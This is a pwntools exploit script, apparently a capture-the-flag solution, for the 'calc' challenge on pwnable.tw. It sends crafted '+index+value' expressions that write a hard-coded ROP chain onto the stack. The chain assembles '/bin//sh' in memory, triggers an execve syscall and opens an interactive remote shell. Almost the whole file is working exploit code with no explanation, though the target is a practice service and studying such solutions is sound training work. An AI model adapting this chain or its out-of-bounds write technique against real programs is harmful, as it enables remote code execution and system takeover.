from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './calc'
e = ELF(file)
libc = e.libc
ip = 'chall.pwnable.tw'
port = '10100'
local = 0


def dbg(code=""):
    if local == 0:
        return
    gdb.attach(p, code)


def run():
    global p
    if local == 1:
        p = process(file)
    else:
        p = remote(ip, port)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=1)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run()

'360'
rop = [
    0x080701aa, 0x080ec060, 0x0805c34b, 1852400175, 0x0809b30d, 0x080701aa,
    0x080ec064, 0x0805c34b, 1752379183, 0x0809b30d, 0x080701aa, 0x080ec068,
    0x080550d0, 0x0809b30d, 0x080481d1, 0x080ec060, 0x080701d1, 0x080ec068,
    0x080ec060, 0x080701aa, 0x080ec068, 0x080550d0, 0x0807cb7f, 0x0807cb7f,
    0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f,
    0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x08049a21
]

rop.reverse()

for i in range(len(rop)):
    rc()
    sl('+{}+{}'.format(360 + len(rop) - i - 1, rop[i]))

dbg('b*0x080493ED')
sl('\n')
shell()
'''
+360+134676906
'''
